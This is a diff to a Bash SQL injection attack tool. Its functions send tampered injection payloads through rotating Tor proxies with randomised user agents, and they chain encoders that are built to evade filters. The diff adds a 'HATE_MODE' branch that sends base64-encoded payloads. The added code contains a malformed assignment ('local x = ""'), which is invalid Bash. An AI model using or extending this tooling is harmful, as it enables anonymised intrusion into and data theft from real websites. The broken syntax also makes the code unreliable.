@@ -124,6 +124,10 @@ vector_sqli_agressor_left() {
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+local defiance_tamper_path = ""
+if [ "$HATE_MODE" = "true" ]; then
+defiance_tamper_path=$(base64_engine "$default_path")
+        else
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
@@ -131,7 +135,8 @@ vector_sqli_agressor_left() {
         local t5=$(space2comment_engine "$t4")
         local t6=$(appendnullbyte_engine "$t5")
         local t7=$(xor_engine "$t6")
-        local defiance_tamper_path=$(weirdcomment_engine "$t7")
+        defiance_tamper_path=$(weirdcomment_engine "$t7")
+fi
         local final_query=""
         if [[ "$defiance_tamper_path" == *"="* ]]; then
             local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
@@ -161,6 +166,11 @@ vector_sqli_agressor_right() {
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+local defiance_tamper_path = ""
+if [ "$HATE_MODE" = "true" ]; then
+            # BYPASS TAMPER: Peluru Base64 dalam file HAHA dikirim utuh tanpa modifikasi
+            defiance_tamper_path=$(base64_engine "$default_path")
+        else
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
@@ -168,7 +178,8 @@ vector_sqli_agressor_right() {
         local t5=$(space2comment_engine "$t4")
         local t6=$(appendnullbyte_engine "$t5")
         local t7=$(xor_engine "$t6")
-        local defiance_tamper_path=$(weirdcomment_engine "$t7")
+        defiance_tamper_path=$(weirdcomment_engine "$t7")
+fi
         local final_query=""
         if [[ "$defiance_tamper_path" == *"="* ]]; then
             local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
